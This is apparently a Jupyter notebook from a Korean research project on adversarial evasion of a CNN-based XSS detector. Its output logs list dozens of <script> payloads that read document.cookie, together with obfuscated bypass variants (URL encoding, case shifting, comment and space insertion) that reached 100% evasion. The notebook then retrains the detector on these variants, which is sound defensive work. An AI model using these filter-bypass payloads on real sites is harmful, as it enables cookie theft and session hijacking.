# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2754BTPPVAFG9U28BC7IJ0YHBAJD4HVHU0JZ5BNZ8AFMYLT8STKG%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [850/874] 원본: <script>console.log('POMIEKG61K9G6QSQ793RGMQQOWMMOQ403BCY36S778QU92J3X4');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27POMIEKG61K9G6QSQ793RGMQQOWMMOQ403BCY36S778QU92J3X4%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [851/874] 원본: <script>console.log('ZM81A0192IRNXT1VUCX21I657LKYD8A4PYR9OMDI6OLSMWZLC0');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscr%253Cscript%253Eipt%253Econsole.log%2528%2527ZM81A0192IRNXT1VUCX21I657LKYD8A4PYR9OMDI6OLSMWZLC0%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [852/874] 원본: <script>console.log('6U1BDW0YI3Q7GI9UP2CMGOH6EMORZABWBOAAW8DBSRU9GZ7P7O');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%276U1BDW0YI3Q7GI9UP2CMGOH6EMORZABWBOAAW8DBSRU9GZ7P7O%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [853/874] 원본: <script>console.log('KGE8ES9SCQ7FORY5VSPTYY4R4UHJNRQTPTAY6L9JR1OU40RPDA');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27KGE8ES9SCQ7FORY5VSPTYY4R4UHJNRQTPTAY6L9JR1OU40RPDA%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [854/874] 원본: <script>console.log('RAL9RHCLJEACUL4MFA93RUJX8FCWEVC9T2EFU6R4DBTN9WS7FX');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27RAL9RHCLJEACUL4MFA93RUJX8FCWEVC9T2EFU6R4DBTN9WS7FX%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [855/874] 원본: <script>console.log('Z1CPD5WLE0FMS3T3GG2DPNVYRAQ7PHX4LH92Y3WKH29WIE1M30');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27Z1CPD5WLE0FMS3T3GG2DPNVYRAQ7PHX4LH92Y3WKH29WIE1M30%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [856/874] 원본: <script>console.log('V42GWR37PQMIPDR8UNS47DSBJONBB3D3N6P6VHPT9C2KTI43X9');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27V42GWR37PQMIPDR8UNS47DSBJONBB3D3N6P6VHPT9C2KTI43X9%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [857/874] 원본: <script>console.log('WFOZB2SFXRFJXPWSTSAUXWVCXAPIOQNYY65HKA5H4XT2R41VKT');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253cscrIpT%253ecOnsoLE.LOg%2528%2527WfOZB2sfXRfJxPwstsauxwvcxapIOqnyy65HKa5H4xT2r41VKT%2527%2529%253bConsoLe.LOg%2528DOcumenT.cOoKiE%2529%253b%253C/ScriPT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: case_shift
#
# [858/874] 원본: <script>console.log('GDDNVTVR9E8BWCSLZYF8E2PJ4TMHCA134NAI8VY83CXQ3FM1NJ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27GDDNVTVR9E8BWCSLZYF8E2PJ4TMHCA134NAI8VY83CXQ3FM1NJ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [859/874] 원본: <script>console.log('BGJ09YVF5142BO7BCZIWL28SK5ZJXKIX4HWU3CPGWQLJX1QWZU');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%2527BGJ09YVF5142BO7BCZIWL28SK5ZJXKIX4HWU3CPGWQLJX1QWZU%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [860/874] 원본: <script>console.log('67KUC3XY7O1ERWW54HW5VAEPCVIKVCMTLYH4823WYZ2ZXOMVKX');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2767KUC3XY7O1ERWW54HW5VAEPCVIKVCMTLYH4823WYZ2ZXOMVKX%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [861/874] 원본: <script>console.log('A9QC9MECB0NSI4T66CS7E15UK2Z5OZRGDLJEDKCCKP5KR7BSOQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CsCrIpt%253EcoNsole.Log%2528%2527A9qc9mecb0Nsi4T66cS7e15UK2z5OZRGdLJEdkCckP5kR7bsoQ%2527%2529%253BcoNSoLE.LoG%2528DOcumenT.CooKIE%2529%253B%253C/sCRIPt%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [862/874] 원본: <script>console.log('C14H8I74C6TT0GAAZUYL3AJVYVK8QZMGMA2FFIZ6802M4L5NLA');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27C14H8I74C6TT0GAAZUYL3AJVYVK8QZMGMA2FFIZ6802M4L5NLA%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [863/874] 원본: <script>console.log('8V14MGQCBI79LL57OSRLRFDF1QSZ3SA0DW33DW1J1JCPZAOY79');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('8V14MGQCBI79LL57OSRLRFDF1QSZ3SA0DW33DW1J1JCPZAOY79');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [864/874] 원본: <script>console.log('DUXOC7CGBMDRBHGQ965ERTBDHSELA60WRDS963ICURHLBU7NNR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27DUXOC7CGBMDRBHGQ965ERTBDHSELA60WRDS963ICURHLBU7NNR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [865/874] 원본: <script>console.log('8EZR9NF1M7RBDQWP2MMB2S47YB5HOFJK1MIUR9INT8GLCQYV38');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%278EZR9NF1M7RBDQWP2MMB2S47YB5HOFJK1MIUR9INT8GLCQYV38%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [866/874] 원본: <script>console.log('8II34I5FM6FGDDIS0PGMPEWW48DO652963N88MF2W4VG811ZJ3');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('8II34I5FM6FGDDIS0PGMPEWW48DO652963N88MF2W4VG811ZJ3');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [867/874] 원본: <script>console.log('0GTD2CA6CLCH4FCF2G7DG9C2FRRNO8NJRC4O4MDW7SKT4TH87T');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%270GTD2CA6CLCH4FCF2G7DG9C2FRRNO8NJRC4O4MDW7SKT4TH87T%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [868/874] 원본: <script>console.log('U4NXYQMWH2S9EMSE2BZ17R11ME5IMLDXF29BAD4GV935YJGLQT');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %25253Cscript%25253Econsole.log%252528%252527U4NXYQMWH2S9EMSE2BZ17R11ME5IMLDXF29BAD4GV935YJGLQT%252527%252529%25253Bconsole.log%252528document.cookie%252529%25253B%25253C/script%25253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [869/874] 원본: <script>console.log('6VKHW4G2QYMS23O2W3A4385921GAOIWIW6WAZZYMI5H5HABYQD');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%276VKHW4G2QYMS23O2W3A4385921GAOIWIW6WAZZYMI5H5HABYQD%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [870/874] 원본: <script>console.log('U9E9DRDPO1W4JZT4WVM9UIV61Y65FMNXUI1K8ZCC25E7NM2D74');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27U9E9DRDPO1W4JZT4WVM9UIV61Y65FMNXUI1K8ZCC25E7NM2D74%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [871/874] 원본: <script>console.log('SD7KD7OQTG8OHMTIS87IHIUYB0DYEUW3TTW3P921XYO65LA9LQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27SD7KD7OQTG8OHMTIS87IHIUYB0DYEUW3TTW3P921XYO65LA9LQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [872/874] 원본: <script>console.log('CDHQ4PAG4W5X2TAO540V4S36PCXILT9SOR43SFGHI3DZASBUWK');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27CDHQ4PAG4W5X2TAO540V4S36PCXILT9SOR43SFGHI3DZASBUWK%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [873/874] 원본: <script>console.log('IALHRGH3I3LO87QM6QHC5X1U9AAUIWKBD1YU2GDSINRNKTZICO');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CsCRipt%253EConSOlE.lOg%2528%2527IalhRGH3i3Lo87qm6QHC5x1u9AaUIwkbD1Yu2gDsINRnKTzICO%2527%2529%253BConSoLe.LOg%2528doCumeNT.COOkIE%2529%253B%253C/SCriPT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [874/874] 원본: pt>console.log('YKQM5DU827QMR3IODIQHQG5FQEE9VNZ4IJ5WKCE9OIUIR4PICI');console.log(document.cookie);</script>
#
# ✅ 우회 결과: pt >COnSoLe.loG('yKQm5du827qMR3iOdiQhqG5fqee9vnZ4IJ5wkCE9oiUir4PICI');coNsole.LOg(DoCUMENt.COOkie);< /ScRIPT >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: case_shift
#
# ✅ 모든 우회 문자열 저장 완료 → generator_output.txt

# %% [markdown]
# 평가

# %%
def evaluate_obfuscation_success(discriminator_model, obf_file_path):
    # 1. 우회 문자열 불러오기
    with open(obf_file_path, "r", encoding="utf-8") as f:
        samples = [line.strip() for line in f if line.strip()]

    total = len(samples)
    fooled = 0

    discriminator_model.eval()
    with torch.no_grad():
        for xss in samples:
            img = string_to_image_matrix(xss)
            tensor = torch.tensor(img, dtype=torch.float32).unsqueeze(0).unsqueeze(0).to(device) / 255.0
            output = discriminator_model(tensor)
            pred = torch.argmax(output, dim=1).item()

            if pred == 0:  # 정상으로 분류 → 탐지 실패
                fooled += 1

    print(f"\n✅ 우회 문자열 평가 결과:")
    print(f" - 전체 개수: {total}")
    print(f" - 탐지 실패 (정상으로 오판): {fooled}")
    print(f" - 우회 성공률: {fooled / total * 100:.2f}%")

# %%
evaluate_obfuscation_success(model, "generator_output.txt")
# Out:
# ✅ 우회 문자열 평가 결과:
#  - 전체 개수: 874
#  - 탐지 실패 (정상으로 오판): 874
#  - 우회 성공률: 100.00%

# %% [markdown]
# D-G GAN 혼합 루트

# %% [markdown]
# 우회 문자열 → 이미지(.npy) 변환 코드

# %%
import numpy as np
import os

def convert_string_to_image_matrix(text, max_len=256):
    arr = np.zeros((16, 16), dtype=np.uint8)
    for i, c in enumerate(text[:max_len]):
        arr[i // 16][i % 16] = ord(c) if ord(c) < 256 else 0
    return arr

def convert_obfuscated_txt_to_npy(input_txt, out_dir):
    with open(input_txt, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip()]

    images = [convert_string_to_image_matrix(t) for t in lines]
    labels = [1] * len(images)  # label 1 = XSS (우회공격도 공격임)

    os.makedirs(out_dir, exist_ok=True)
    np.save(os.path.join(out_dir, "images.npy"), np.array(images))
    np.save(os.path.join(out_dir, "labels.npy"), np.array(labels))
    print(f"✅ 우회 이미지 저장 완료: {out_dir}/images.npy, labels.npy")

# 사용 예시
convert_obfuscated_txt_to_npy("generator_output.txt", "dataset_obfuscated")
# Out:
# ✅ 우회 이미지 저장 완료: dataset_obfuscated/images.npy, labels.npy

# %% [markdown]
# 3개 클래스 병합 후 분할

# %%
def merge_and_split_all_with_existing_splits(
    train_img, train_lbl,
    val_img, val_lbl,
    test_img, test_lbl,
    obf_img, obf_lbl,
    out_dir="dataset_gan_split"
):
    import numpy as np
    import os

    # 기존 분할 데이터 로드
    X_train = np.load(train_img)
    y_train = np.load(train_lbl)
    X_val = np.load(val_img)
    y_val = np.load(val_lbl)
    X_test = np.load(test_img)
    y_test = np.load(test_lbl)

    # 우회 샘플 로드
    X_obf = np.load(obf_img)
    y_obf = np.load(obf_lbl)

    # 비율 유지하며 6:2:2 비율로 분할
    n = len(X_obf)
    n_train = int(n * 0.6)
    n_val = int(n * 0.2)

    X_obf_train, y_obf_train = X_obf[:n_train], y_obf[:n_train]
    X_obf_val, y_obf_val = X_obf[n_train:n_train+n_val], y_obf[n_train:n_train+n_val]
    X_obf_test, y_obf_test = X_obf[n_train+n_val:], y_obf[n_train+n_val:]

    # 병합
    X_train_merge = np.concatenate([X_train, X_obf_train], axis=0)
    y_train_merge = np.concatenate([y_train, y_obf_train], axis=0)

    X_val_merge = np.concatenate([X_val, X_obf_val], axis=0)
    y_val_merge = np.concatenate([y_val, y_obf_val], axis=0)

    X_test_merge = np.concatenate([X_test, X_obf_test], axis=0)
    y_test_merge = np.concatenate([y_test, y_obf_test], axis=0)

    # 저장
    os.makedirs(out_dir, exist_ok=True)
    np.save(os.path.join(out_dir, "train_images.npy"), X_train_merge)
    np.save(os.path.join(out_dir, "train_labels.npy"), y_train_merge)
    np.save(os.path.join(out_dir, "val_images.npy"), X_val_merge)
    np.save(os.path.join(out_dir, "val_labels.npy"), y_val_merge)
    np.save(os.path.join(out_dir, "test_images.npy"), X_test_merge)
    np.save(os.path.join(out_dir, "test_labels.npy"), y_test_merge)

    print(f"✅ 병합 및 저장 완료 → {out_dir}")
    print(f" - Train: {len(X_train_merge)}")
    print(f" - Val:   {len(X_val_merge)}")
    print(f" - Test:  {len(X_test_merge)}")

# %%
merge_and_split_all_with_existing_splits(
    train_img="train_images.npy",
    train_lbl="train_labels.npy",
    val_img="val_images.npy",
    val_lbl="val_labels.npy",
    test_img="test_images.npy",
    test_lbl="test_labels.npy",
    obf_img="dataset_obfuscated/images.npy",
    obf_lbl="dataset_obfuscated/labels.npy",
    out_dir="dataset_gan_split"
)
# Out:
# ✅ 병합 및 저장 완료 → dataset_gan_split
#  - Train: 1718
#  - Val:   430
#  - Test:  433

# %% [markdown]
# Discriminator 재학습 (GAN용)

# %%
# 불러오기
train_loader = create_dataloader_from_files("dataset_gan_split/train_images.npy", "dataset_gan_split/train_labels.npy", shuffle=True)
val_loader = create_dataloader_from_files("dataset_gan_split/val_images.npy", "dataset_gan_split/val_labels.npy")
test_loader = create_dataloader_from_files("dataset_gan_split/test_images.npy", "dataset_gan_split/test_labels.npy")

# 모델 초기화 및 학습
model = DiscriminatorAlexNet()
train_discriminator(model, train_loader, val_loader, epochs=15, lr=1e-3)

# 평가
evaluate_model(model, test_loader)
# Out:
# Epoch 1/15 | Loss: 13.4692 | Train Acc: 0.9075
#            >> Val Acc: 0.9907
# Epoch 2/15 | Loss: 0.9717 | Train Acc: 0.9965
#            >> Val Acc: 1.0000
# Epoch 3/15 | Loss: 0.5286 | Train Acc: 0.9977
#            >> Val Acc: 1.0000
# Epoch 4/15 | Loss: 0.4726 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 5/15 | Loss: 0.5616 | Train Acc: 0.9988
#            >> Val Acc: 1.0000
# Epoch 6/15 | Loss: 0.4792 | Train Acc: 0.9988
#            >> Val Acc: 0.9953
# Epoch 7/15 | Loss: 0.3139 | Train Acc: 0.9988
#            >> Val Acc: 1.0000
# Epoch 8/15 | Loss: 0.2306 | Train Acc: 0.9988
#            >> Val Acc: 0.9953
# Epoch 9/15 | Loss: 0.2166 | Train Acc: 0.9994
#            >> Val Acc: 0.9977
# Epoch 10/15 | Loss: 0.2388 | Train Acc: 0.9994
#            >> Val Acc: 1.0000
# Epoch 11/15 | Loss: 0.0220 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 12/15 | Loss: 0.0517 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 13/15 | Loss: 0.1049 | Train Acc: 0.9994
#            >> Val Acc: 0.9953
# Epoch 14/15 | Loss: 0.0722 | Train Acc: 0.9994
#            >> Val Acc: 1.0000
# Epoch 15/15 | Loss: 0.0079 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
#
# ✅ 최종 테스트 결과:
#               precision    recall  f1-score   support
#
#       Normal       0.99      0.99      0.99       134
#          XSS       0.99      1.00      0.99       299
#
#     accuracy                           0.99       433
#    macro avg       0.99      0.99      0.99       433
# weighted avg       0.99      0.99      0.99       433
